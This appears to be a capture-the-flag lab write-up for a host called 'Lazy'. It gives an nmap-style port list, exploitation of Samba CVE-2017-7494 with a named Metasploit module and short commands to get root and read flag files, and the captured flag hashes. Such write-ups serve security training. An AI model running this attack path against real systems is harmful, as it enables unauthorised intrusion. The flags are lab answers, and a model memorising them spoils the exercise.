# Lazy

**IP Address:** 172.31.1.1

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 139/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X |
| 22/tcp | open | ssh | OpenSSH 5.9p1 Debian 5ubuntu1.10 |
| 445/tcp | open | netbios-ssn | Samba smbd 3.6.25 |
| 80/tcp | open | http | nginx 1.1.19 |
| 137/udp | open|filtered | netbios-ns |   |
| 138/udp | open|filtered | netbios-dgm |   |
| 49152/udp | open|filtered | unknown |   |
| 68/udp | open|filtered | dhcpc |   |

## Exploitation
### Exploit Details (Metasploit)
* **Name** - Samba is_known_pipename() Arbitrary Module Load
* **CVE** - 2017-7494
* **Module** - exploit/linux/samba/is_known_pipename
* **Disclosed** - 2017-03-24
* **References**
  * https://nvd.nist.gov/vuln/detail/CVE-2017-7494                
  * https://www.samba.org/samba/security/CVE-2017-7494.html


1. Show metasploit options

Commands
```
show options
```

![Execute Exploit](images/exploit1.png)

2. Run exploit
Commands
```
run
whoami
cat /home/adam/access.txt
cat /root/system.txt
```

![Execute Exploit](images/privesc2.png)

## Loot
```
access.txt
899661bdf5057dabf7c652dd75f00fb8
system.txt
17307fd709f556f59e2c698b7495476c
```